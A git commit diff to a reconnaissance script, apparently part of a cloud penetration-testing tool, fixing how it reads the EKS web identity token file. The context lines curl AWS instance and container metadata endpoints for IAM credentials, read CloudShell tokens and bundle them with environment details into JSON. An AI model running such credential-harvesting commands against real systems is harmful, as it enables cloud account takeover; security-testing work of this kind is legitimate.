fe6e3b0fef2f24692ed5858e256cfb76d143c157
Nick Jones <nick.jones@f-secure.com>
2022-01-18 16:04:23 +0100

    fixed eks web identity command

--- recon.sh
+++ recon.sh
@@ -14,7 +14,7 @@ chmod +x ./amicontained
     --arg getec2metadatav1 "`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl http://169.254.169.254/latest/meta-data/iam/)`" \
     --arg getec2metadatav2 "$(TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\") && curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl http://169.254.169.254/latest/meta-data/iam/ -H \"X-aws-ec2-metadata-token: $TOKEN\") -H \"X-aws-ec2-metadata-token: $TOKEN\")" \
     --arg getecsmetadata "`curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`" \
-    --arg getekswebidentityfile "`cat AWS_WEB_IDENTITY_TOKEN_FILE`" \
+    --arg getekswebidentityfile "`cat $AWS_WEB_IDENTITY_TOKEN_FILE`" \
     --arg getcloudshell "`curl $AWS_CONTAINER_CREDENTIALS_FULL_URI -H \"Authorization: $AWS_CONTAINER_AUTHORIZATION_TOKEN\"`" \
     '{"id": $id, "env": $printenv, "os": $os, "hostname": $hostname, "processes": $processes, "mounts": $mounts, "tools": $tools, "amicontained": $amicontained, "local-creds": $getlocalcreds, "curl-google": $curlgoogle, "ec2-metadata-v1": $getec2metadatav1, "ec2-metadata-v2": $getec2metadatav2, "ecs-metadata": $getecsmetadata, "eks-web-identity":$getekswebidentityfile, "cloud-shell": $getcloudshell}'
 
